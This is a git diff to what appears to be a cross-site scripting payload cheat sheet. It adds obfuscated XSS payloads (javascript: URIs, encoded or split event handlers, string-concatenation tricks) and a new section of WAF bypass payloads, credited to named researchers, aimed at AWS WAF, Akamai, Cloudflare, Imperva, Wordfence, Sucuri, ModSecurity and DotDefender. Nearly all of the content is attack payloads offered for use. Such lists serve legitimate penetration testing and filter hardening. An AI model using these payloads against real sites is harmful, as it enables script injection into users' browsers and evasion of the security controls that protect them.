@@ -6,7 +6,10 @@ Try to use this payloads :
 
 2) <a href="&#01;javascript:alert(1)">Click</a>
 
-3) <a src="google.com" onclick="alert(1)">Click</a>
+3) <a href="javascript:{ alert`0` }">Click</a>
+
+4) <a src="google.com" onclick="alert(1)">Click</a>
+
 ```
 Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:
 ```
@@ -172,12 +175,16 @@ Try to use this payloads :
 
 5) <script>prompt(1)</script>
 
-6) <script>/&/-alert(1)</script>
+6) <a"/onclick=(confirm)()>Click Here!
+
+7) <script>/&/-alert(1)</script>
 <script>/&amp;/-alert(1)</script>
 
-7) %00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)
+8) %00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)
 
+9) <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">
 
+10) <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 
 ```
 
 ### 4.If space is encoded or deleted
@@ -195,3 +202,33 @@ use tab url encode : %09
 ```
 SVG, img, iframe 
 ```
+   
+### 5.Some WAF bypass:
+```
+@vanshitmalhotra | Bypass AWS WAF -// 
+Add "<!" (without quotes) before your payload and bypass that WAF. :)
+eg: <!<script>confirm(1)</script>
+
+@black0x00mamba | Bypass WAF Akamaighost & filtered onload, onclick, href, src, onerror, script, etc 
+<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
+
+DotDefender WAF bypass by @0xInfection 
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+
+@LooseSecurity | Updated CloudFlare bypass (bypasses virtually all WAF you'll encounter in the wild):
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+Javascript URI cushioned between carriage returns with a non-bracketed prompt.
+
+@daveysec | Was able to bypass Imperva Incapsula WAF with:
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+@rodolfoassis | Wordfence 7.4.2
+<a href=&#01javascript:alert(1)>
+
+rodolfoassis | Sucuri CloudProxy (POST only)
+<a href=javascript&colon;confirm(1)>
+
+rodolfoassis | ModSecurity CRS 3.2.0 PL1
+<a href="jav%0Dascript&colon;alert(1)">
+``` 
+
